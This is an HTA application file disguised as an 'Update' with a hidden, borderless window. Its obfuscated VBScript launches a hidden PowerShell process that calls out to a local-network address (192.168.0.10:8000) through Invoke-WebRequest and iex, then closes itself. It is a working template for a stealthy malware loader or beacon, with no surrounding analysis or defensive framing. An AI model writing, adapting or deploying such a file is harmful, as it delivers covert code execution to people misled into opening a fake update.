<html>
<head>
    <HTA:APPLICATION 
        ID="stealth"
        APPLICATIONNAME="Update"
        BORDER="none"
        CAPTION="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        WINDOWSTATE="minimize"
    >
    <script language="VBScript">
        On Error Resume Next
        Dim a,b,c,d
        a = "WScript" & "." & "Shell"
        Set b = CreateObject(a)
        c = "cmd /c powershell -w hidden -nop -c "
        d = "$w='Invo'+'ke-WebR'+'equest';$u='http://192.168.0.10:8000/ping';iex ($w + ' ' + $u)"
        b.Run c & d, 0, False
        self.close
    </script>
</head>
<body></body>
</html>
